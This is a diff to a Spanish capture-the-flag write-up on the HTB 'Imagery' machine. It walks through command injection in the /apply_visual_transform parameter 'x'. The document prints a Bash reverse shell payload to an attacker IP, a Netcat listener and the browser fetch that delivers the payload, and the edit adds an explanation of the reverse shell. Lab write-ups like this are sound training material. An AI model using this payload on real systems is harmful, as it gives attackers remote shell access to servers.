@@ -408,11 +408,11 @@ hashcat "2c65c8d7bfbca32a3ed42596192384f6" -m 0 -a 0 /usr/share/SecLists/Passwor
 
 Con estas credenciales, cerramos la sesión de administrador e iniciamos sesión como **testuser@imagery.htb**. Ahora, el servidor permitirá que nuestras peticiones al endpoint `/apply_visual_transform` procesen las transformaciones de imagen, desbloqueando nuestro vector de **RCE**.
 
-### 2.3.2 Ataque
+### 2.3.2 Web Shell
 
-Para inyectar el comando remoto, necesitamos subir una imagen para acceder a las opciones de recortar, rotar, etc. Mediante la peticion `upload_imag`. 
+Para disparar la vulnerabilidad de inyección de comandos, es requisito que el usuario cuente con al menos una imagen previa en su galería, permitiendo así invocar la peticion `/apply_visual_transform`. El objetivo técnico es forzar al servidor a ejecutar una Reverse Shell (o shell inversa).
 
-Por medio de **NetCat** pondremos nuentra maquina atacanque en escucha para revicir la comunicacion via rever shell de la App Web.
+En nuestra máquina de ataque, inicializamos un listener con **Netcat** para capturar la comunicación entrante:
 
 ```
 nc -lvnp 8080
@@ -425,7 +425,13 @@ Para que el servidor web se conecte hacia nuentra maquina haremos uso del siguie
 ; bash -c 'bash -i >& /dev/tcp/{IP_ATACANTE}/{PUERTO} 0>&1' #
 ```
 
-Procedemos a capturar el fetch de la peticion `/apply_visual_transform` manipulamos el parametro `x` como lo explicamos anteriormente e inyectamos el payload y ejecutamos el fetch en la consala del navegador para que el servidor procese nuestra peticion. 
+- `bash -i`: Invoca una shell de Bash interactiva.
+
+- `>& /dev/tcp/{IP}/{PORT}`: Redirige la salida estándar (`stdout`) y el error estándar (`stderr`) hacia un socket TCP dirigido a nuestra IP.
+
+- `0>&1`: Redirige la entrada estándar (`stdin`) al mismo descriptor de archivo, permitiendo que los comandos que enviemos desde Netcat sean ejecutados por la shell de la víctima.
+
+Procedemos a capturar el fetch de la peticion `/apply_visual_transform` e inyectar el payload en el parametro `x` y ejecutamos el fetch en la consala del navegador.
 
 ```js
 await fetch("http://imagery.htb:8000/apply_visual_transform", {
@@ -449,7 +455,7 @@ await fetch("http://imagery.htb:8000/apply_visual_transform", {
 });
 ```
 
-Como consecuencia la App Web se conecta a la maquina atacante proporcionandole acceso al servidor via shell(rever shell) en el cual podremos intractuar con el servidor, navegando facimento por todos los directorios. 
+Al procesar la solicitud, el servidor ejecuta nuestra cadena maliciosa bajo el contexto del usuario **web**, estableciendo el túnel de control:
 
 ```
 nc -lvnp 8080
